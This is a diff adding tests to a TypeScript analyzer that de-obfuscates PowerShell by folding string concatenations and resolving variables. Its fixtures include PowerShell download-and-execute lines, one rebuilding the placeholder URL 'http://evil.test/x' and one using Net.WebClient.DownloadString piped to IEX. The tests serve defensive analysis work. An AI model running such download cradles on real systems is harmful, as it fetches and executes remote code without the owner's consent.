@@ -1,6 +1,6 @@
 // shared/analyzer/__tests__/resolve.test.ts
 import { describe, expect, it } from 'vitest'
-import { foldConcat, resolveVars } from '../resolve'
+import { foldConcat, resolveVars, resolve } from '../resolve'
 
 describe('foldConcat', () => {
   it('collapses a chain of string-literal concatenations', () => {
@@ -42,5 +42,16 @@ describe('resolveVars', () => {
   it('escapes single quotes in a substituted variable value', () => {
     // $p lexes to value `a'b`; substituted use re-quotes with '' escaping
     expect(resolveVars("$p = 'a''b' ; IEX $p")).toContain("IEX 'a''b'")
+  })
+})
+
+describe('resolve (fixpoint)', () => {
+  it('resolves variable-built concatenation across statements', () => {
+    const out = resolve("$a = 'http://ev' ; $b = 'il.test/x' ; $u = $a + $b ; IEX $u")
+    expect(out).toContain("IEX 'http://evil.test/x'")
+  })
+  it('is idempotent on already-clean input', () => {
+    const clean = "IEX ( New-Object Net.WebClient ) . DownloadString ( 'http://a/x' )"
+    expect(resolve(clean)).toBe(resolve(resolve(clean)))
   })
 })
